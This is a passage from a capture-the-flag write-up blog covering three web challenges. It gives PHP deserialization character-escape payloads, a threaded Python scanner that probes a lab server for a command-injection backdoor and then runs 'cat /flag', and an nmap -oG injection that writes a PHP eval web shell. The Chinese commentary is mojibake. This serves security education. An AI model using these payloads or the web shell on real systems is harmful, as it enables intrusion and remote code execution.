</span></span><span class="line"><span class="cl">    <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span><span class="nv">$filter_arr</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$img</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;user&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;guest&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;function&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$function</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$function</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;a href=&#34;index.php?f=highlight_file&#34;&gt;source_code&lt;/a&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img_path&#39;</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="s1">&#39;guest_img.png&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img_path&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$serialize_info</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$function</span> <span class="o">==</span> <span class="s1">&#39;highlight_file&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$function</span> <span class="o">==</span> <span class="s1">&#39;phpinfo&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;phpinfo();&#39;</span><span class="p">);</span> <span class="c1">//maybe you can find something in here!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$function</span> <span class="o">==</span> <span class="s1">&#39;show_image&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$userinfo</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$serialize_info</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$userinfo</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä»£ç é€»è¾‘æ˜¯extractä¼ å…¥å˜é‡ï¼Œæ”¹å˜session[img]ä¸ºå›ºå®šå€¼ï¼Œåºåˆ—åŒ–sessionç„¶åè¿‡æ»¤ï¼Œååºåˆ—åŒ–ï¼Œbase64è§£ç è¯»å–å†…å®¹</p>
<p>å…ˆçœ‹çœ‹phpinfo,æ‰¾åˆ°d0g3_f1ag.php</p>
<h3 id="phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸">phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸
</h3><p>åœ¨phpä¸­ï¼Œååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¿…é¡»ä¸¥æ ¼æŒ‰ç…§åºåˆ—åŒ–è§„åˆ™æ‰èƒ½æˆåŠŸå®ç°ååºåˆ—åŒ–ï¼Œä½†å¦‚æœæˆ‘ä»¬åœ¨åºåˆ—åŒ–å­—ç¬¦ä¸²ååŠ éšæœºå­—ç¬¦ä¸²</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$str</span><span class="o">=</span><span class="s1">&#39;a:2:{i:0;s:8:&#34;Hed9eh0g&#34;;i:1;s:5:&#34;aaaaa&#34;;}abc&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$str</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ä»»ç„¶è¾“å‡ºåŸæ¥çš„ç»“æœ,å› ä¸ºä»–è¯»åˆ°}å°±åœæ­¢äº†ï¼Œä¸ä¼šè¯»å–}åçš„å­—ç¬¦ä¸²</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;user&#34;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;flagflagflagflagflagflag&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;function&#34;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;a&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:2:&#34;dd&#34;;s:1:&#34;a&#34;;}&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;img&#34;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;L2QwZzNfZmxsbGxsbGFn&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">    
</span></span></span><span class="line"><span class="cl"><span class="err">//a:3:{s:4:&#34;user&#34;;s:24:&#34;flagflagflagflagflagflag&#34;;s:8:&#34;function&#34;;s:59:&#34;a&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:2:&#34;dd&#34;;s:1:&#34;a&#34;;}&#34;;s:3:&#34;img&#34;;s:20:&#34;L2QwZzNfZmxsbGxsbGFn&#34;;}
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„functioné‡Œé¢å¼€å¤´çš„<code>&quot;a</code>æ˜¯ä¸ºäº†åºåˆ—åŒ–ä¹‹åè·Ÿå‰é¢çš„&quot;æ‹¼æ¥</p>
<p>ç„¶åå› ä¸ºflagä¼šè¢«ç©ºæ›¿æ¢ï¼Œå˜æˆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a:3:{s:4:&#34;user&#34;;s:24:&#34;&#34;;s:8:&#34;function&#34;;s:59:&#34;a&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:2:&#34;dd&#34;;s:1:&#34;a&#34;;}&#34;;s:3:&#34;img&#34;;s:20:&#34;L2QwZzNfZmxsbGxsbGFn&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ¬æ¥ç”±äºæœ‰6ä¸ªflagå­—ç¬¦æ‰€ä»¥ä¸º24ï¼Œç°åœ¨è¿™6ä¸ªflagéƒ½è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆå®ƒå°†ä¼šå°è¯•å‘åè¯»å–24ä¸ªå­—ç¬¦çœ‹çœ‹æ˜¯å¦æ»¡è¶³åºåˆ—åŒ–çš„è§„åˆ™ï¼Œä¹Ÿå³è¯»å–<code>;s:8:&quot;function&quot;;s:59:&quot;a</code>,è¯»å–è¿™24ä¸ªå­—ç¬¦åä»¥<code>&quot;;</code>ç»“å°¾ï¼Œæ°å¥½æ»¡è¶³è§„åˆ™ï¼Œè€Œåç¬¬ä¸‰ä¸ªså‘åè¯»å–imgçš„20ä¸ªå­—ç¬¦ï¼Œç¬¬å››ä¸ªã€ç¬¬äº”ä¸ªså‘åè¯»å–å‡æ»¡è¶³è§„åˆ™</p>
<p>æœ€ç»ˆç»“æœä¸º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">array(3) { 
</span></span><span class="line"><span class="cl">[&#34;user&#34;]=&gt; string(24) &#34;&#34;;s:8:&#34;function&#34;;s:59:&#34;a&#34; 
</span></span><span class="line"><span class="cl">[&#34;img&#34;]=&gt; string(20) &#34;ZDBnM19mMWFnLnBocA==&#34; 
</span></span><span class="line"><span class="cl">[&#34;dd&#34;]=&gt; string(1) &#34;a&#34; 
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ ·å°±æŠŠåŸæ¥ä¸å¯å˜çš„Imgç»™æ›¿æ¢äº†</p>
<p>ç„¶åæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªsessionè®©ä»–åºåˆ—åŒ–å°±è¡Œäº†,æœ‰ä¸¤ç§ç»•è¿‡åŠæ³•ï¼Œç¬¬ä¸€ç§è®©<code>__SESSION[flagflag]</code>ä¼ å…¥å¼€å¤´ä¸º&quot;çš„å­—ç¬¦ä¸²ï¼Œè¿™æ ·åºåˆ—åŒ–ï¼Œå°±ä¼šæ‹¼æ¥ä¸ºç©ºé€ æˆä¸Šé¢çš„ç»•è¿‡ï¼ˆä¸çŸ¥é“ä¸ºä»€ä¹ˆå¤ç°ä¸äº†ï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$_SESSION[&#39;flagflag&#39;]=&#39;&#34;;s:3:&#34;aaa&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;}&#39;;
</span></span><span class="line"><span class="cl">    #ç»“æœ a:1:{s:8:&#34;flagflag&#34;;s:51:&#34;&#34;;s:3:&#34;aaa&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;}&#34;;}ï¼Œè¿™é‡Œå°±é€ æˆimgä¸æˆä¸ºä¸€ä¸ªé”®ï¼Œä¹Ÿå°±æ— æ³•è¿›è¡ŒåŠ å¯†
</span></span><span class="line"><span class="cl">    #è¿‡æ»¤æ‰flagæœ‰
</span></span><span class="line"><span class="cl">    #a:1:{s:8:&#34;&#34;;s:51:&#34;&#34;;s:3:&#34;aaa&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;}&#34;;}
</span></span><span class="line"><span class="cl">    #ä½¿å¾—ç»•è¿‡;s:51:&#34;&#34;åˆ°è¾¾ä¸‹ä¸€ä¸ªåˆ†å·ï¼Œè¿™æ—¶imgæˆåŠŸé€ƒé€¸å‡ºæ¥
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¬¬äºŒç§ç›´æ¥æ„é€ ä¸‰ä¸ªsession,ç„¶ååœ¨ç¬¬ä¸€ä¸ªsessionçš„å€¼ä¼ å¾ˆå¤šflag,è¿‡æ»¤åå°±ä¼šåŒ¹é…åé¢çš„sessionæ¥æ›¿æ¢img</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">_SESSION[a]=phpflagflagflagflagflagflagflagflagflagflagflagflagflag&amp;_SESSION[img]=1&amp;_SESSION[exp]=;s:3:&#34;img&#34;;s:20:&#34;L2QwZzNfZmxsbGxsbGFn&#34;;i:0;i:1;}
</span></span><span class="line"><span class="cl">åºåˆ—åŒ–å
</span></span><span class="line"><span class="cl">&#34;a:3:{s:1:&#34;a&#34;;s:55:&#34;&#34;;s:3:&#34;img&#34;;s:20:&#34;Z3Vlc3RfaW1nLnBuZw==&#34;;s:3:&#34;exp&#34;;s:40:&#34;;s:3:&#34;img&#34;;s:20:&#34;L2QwZzNfZmxsbGxsbGFn&#34;;i:0;i:1;}&#34;;}&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">_SESSION[user]=flagflagflagflagflagphp&amp;_SESSION[function]=&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:1:&#34;1&#34;;s:1:&#34;2&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="å¼ºç½‘æ¯-2019é«˜æ˜çš„é»‘å®¢">[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢
</h2><p>ç”¨è„šæœ¬ç­›é€‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">thread_</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Semaphore</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span> <span class="c1"># è®¾ç½®æœ€å¤§çº¿ç¨‹æ•° ,åˆ«è®¾ç½®å¤ªå¤§ï¼Œä¸ç„¶è¿˜æ˜¯ä¼šå´©çš„</span>
</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">adapters</span><span class="o">.</span><span class="n">DEFAULT_RETRIES</span> <span class="o">=</span> <span class="mi">5</span> <span class="c1">#è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span> 
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">keep_alive</span> <span class="o">=</span> <span class="kc">False</span> <span class="c1"># è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">buu_url</span> <span class="o">=</span> <span class="s2">&#34;http://35a34fe5-7916-4ebf-a7ff-bfd82fe9bd4a.node4.buuoj.cn:81&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">filePath</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;D:\Downloads\src&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">filePath</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">files</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">filePath</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flags</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rrGET</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;\$_GET\[\&#39;(\w+)\&#39;\]&#34;</span><span class="p">)</span> <span class="c1"># åŒ¹é…getå‚æ•°</span>
</span></span><span class="line"><span class="cl"><span class="n">rrPOST</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;\$_POST\[\&#39;(\w+)\&#39;\]&#34;</span><span class="p">)</span> <span class="c1"># åŒ¹é…postå‚æ•°</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getflag</span><span class="p">(</span><span class="n">file</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+]checking file:</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">file</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">thread_</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">buu_url</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">file</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">gets</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">rrGET</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">        <span class="n">posts</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">rrPOST</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">g</span> <span class="ow">in</span> <span class="n">gets</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[++]checking </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">g</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.02</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;?</span><span class="si">%s</span><span class="s2">=</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="s2">&#34;echo ------&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;------&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;fileName=</span><span class="si">%s</span><span class="s2">, param=</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">g</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">flags</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">posts</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[++]checking </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">p</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="n">p</span><span class="p">:</span><span class="s2">&#34;echo ------&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;------&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;fileName=</span><span class="si">%s</span><span class="s2">, param=</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">g</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">flags</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">thread_</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">thread_list</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="p">(</span><span class="n">files</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">getflag</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">file</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl">        <span class="n">thread_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">thread_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">thread_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[end]ç¨‹åºç»“æŸ:ç”¨æ—¶(ç§’):&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">end_time</span><span class="o">-</span><span class="n">start_time</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ€åå‚æ•°ä¸º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/xk0SzyKwfzw.php?Efa5BVG=cat /flag
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„nmap">[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap
</h2><p>é¢˜ç›®å«nmapæƒ³åˆ°ä¹‹å‰çš„ä¸€é“é¢˜online toolç”¨-oGå‚æ•°å†™å…¥æœ¨é©¬ï¼Œç”¨å•å¼•å·åŠ ç©ºæ ¼ç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; &lt;?php @eval($_POST[&#34;cmd&#34;]);?&gt; -oG shell.php &#39;
</span></span></code></pre></td></tr></table>
</div>
